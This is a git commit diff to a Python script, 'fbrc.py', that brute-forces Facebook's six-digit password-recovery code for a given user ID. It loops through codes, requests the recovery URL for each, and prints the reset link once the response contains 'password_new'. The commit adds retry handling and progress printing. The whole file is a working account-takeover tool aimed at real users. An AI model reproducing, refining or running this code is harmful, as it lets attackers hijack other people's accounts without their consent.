40ab3c4fee82cc88e4b9d11c9b1b9c69d4f265a1
e2002e <yvain29@gmail.com>
2024-10-04 12:30:35 +0200

    Update fbrc.py

--- fbrc.py
+++ fbrc.py
@@ -1,4 +1,4 @@
-#! /usr/bin/python3.11
+#! /usr/bin/python
 
 import requests
 import sys
@@ -7,19 +7,15 @@ i = 0
 
 array = [0,0,0,0,0,0]
 chars = "0123456789"
-password = "000000"
 user_id = sys.argv[1]
+lock = False
 
 for i in range(1000000):
-    x = requests.get(f'https://www.facebook.com/recover/password/?u={user_id}&n={password}')
-    if 'password_new' in x.text:
-        print(f'connect to https://www.facebook.com/recover/password/?u={user_id}&n={password}')
-        sys.exit()
     password = ""
 
     i+=1
     if i % 10000 == 0:
-        print(i / 10000)
+        print(f'{i / 10000} / 100')
 
     for j in range(6):
         password += chars[array[j]]
@@ -29,3 +25,17 @@ for i in range(1000000):
         if array[j] >= 10:
             array[j] = 0
             break
+
+    try:
+        x = requests.get(f'https://www.facebook.com/recover/password/?u={user_id}&n={password}')
+    except:
+        if not lock:
+            i-=1
+            lock = True
+        continue
+    lock = False
+    if 'password_new' in x.text:
+        print(f'connect to https://www.facebook.com/recover/password/?u={user_id}&n={password}')
+        sys.exit()
+
+    print(f'{password}:{i+1}')
